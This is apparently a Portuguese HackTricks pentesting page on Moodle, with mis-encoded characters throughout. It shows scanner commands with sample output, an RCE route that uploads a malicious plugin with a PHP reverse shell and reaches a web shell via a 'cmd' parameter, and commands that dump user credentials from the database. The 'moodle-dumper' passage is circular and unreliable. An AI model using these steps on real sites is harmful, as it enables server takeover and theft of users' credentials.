# Moodle

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se vocÃª estÃ¡ interessado em **carreira de hacking** e hackear o impossÃ­vel - **estamos contratando!** (_fluÃªncia em polonÃªs escrita e falada Ã© necessÃ¡ria_).

{% embed url="https://www.stmcyber.com/careers" %}

## Scans AutomÃ¡ticos

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
    3.10.0-beta

[+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

O `moodlescan` Ã© uma ferramenta de varredura automatizada para detectar vulnerabilidades em instalaÃ§Ãµes do Moodle. Ele pode ser usado para identificar vulnerabilidades conhecidas, como SQL injection, cross-site scripting (XSS) e inclusÃ£o de arquivos locais (LFI), bem como para encontrar informaÃ§Ãµes Ãºteis, como usuÃ¡rios, cursos e plugins instalados.

A ferramenta Ã© fÃ¡cil de usar e pode ser executada a partir da linha de comando. Ele suporta vÃ¡rios tipos de autenticaÃ§Ã£o, incluindo autenticaÃ§Ã£o bÃ¡sica e autenticaÃ§Ã£o de cookies. AlÃ©m disso, ele pode ser configurado para ignorar certos tipos de vulnerabilidades ou para procurar apenas vulnerabilidades especÃ­ficas.

O `moodlescan` Ã© uma ferramenta Ãºtil para administradores do Moodle e testadores de penetraÃ§Ã£o que desejam verificar a seguranÃ§a de suas instalaÃ§Ãµes do Moodle. No entanto, Ã© importante lembrar que a ferramenta nÃ£o Ã© uma soluÃ§Ã£o completa de seguranÃ§a e nÃ£o deve ser usada como a Ãºnica medida de seguranÃ§a para uma instalaÃ§Ã£o do Moodle.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl
	
.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

CMSMap Ã© uma ferramenta de cÃ³digo aberto que ajuda a identificar a versÃ£o e os plugins instalados em um site Moodle. Ele tambÃ©m pode ser usado para encontrar vulnerabilidades conhecidas em versÃµes especÃ­ficas do Moodle. A ferramenta Ã© executada em linha de comando e pode ser facilmente integrada a scripts de automaÃ§Ã£o de testes de penetraÃ§Ã£o.
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

Descobri que as ferramentas automÃ¡ticas sÃ£o bastante **inÃºteis para encontrar vulnerabilidades que afetam a versÃ£o do moodle**. VocÃª pode **verificÃ¡-las** em [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)

## **RCE**

VocÃª precisa ter a funÃ§Ã£o de **gerente** e **pode instalar plugins** dentro da guia **"AdministraÃ§Ã£o do site"**\*\*:\*\*

![](<../../.gitbook/assets/image (447).png>)

Se vocÃª Ã© gerente, ainda pode precisar **ativar essa opÃ§Ã£o**. VocÃª pode ver como no PoC de escalonamento de privilÃ©gios do moodle: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

Em seguida, vocÃª pode **instalar o seguinte plugin** que contÃ©m o shell reverso php clÃ¡ssico do pentest-monkey (_antes de fazer o upload, vocÃª precisa descompactÃ¡-lo, alterar o IP e a porta do revshell e compactÃ¡-lo novamente_)

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

Ou vocÃª pode usar o plugin de [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE) para obter um shell PHP regular com o parÃ¢metro "cmd".

Para acessar o plugin malicioso, vocÃª precisa acessar:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### Encontrar credenciais do banco de dados
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### Extrair Credenciais do Banco de Dados

Para extrair as credenciais do banco de dados do Moodle, vocÃª pode usar a ferramenta `moodle-dumper`. Esta ferramenta pode ser encontrada em https://github.com/riw777/moodle-dumper.

Para usÃ¡-la, vocÃª precisa fornecer as credenciais do banco de dados do Moodle e o caminho para o diretÃ³rio onde deseja salvar o arquivo de despejo. O comando a seguir pode ser usado para extrair as credenciais do banco de dados:

```
python moodle-dumper.py -u <db_username> -p <db_password> -d <db_name> -o <output_directory>
```

Depois de executar este comando, vocÃª deve ter um arquivo de despejo do banco de dados do Moodle que contÃ©m as credenciais do banco de dados.
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se vocÃª estÃ¡ interessado em uma **carreira em hacking** e quer hackear o que nÃ£o pode ser hackeado - **estamos contratando!** (_fluÃªncia em polonÃªs escrita e falada Ã© necessÃ¡ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
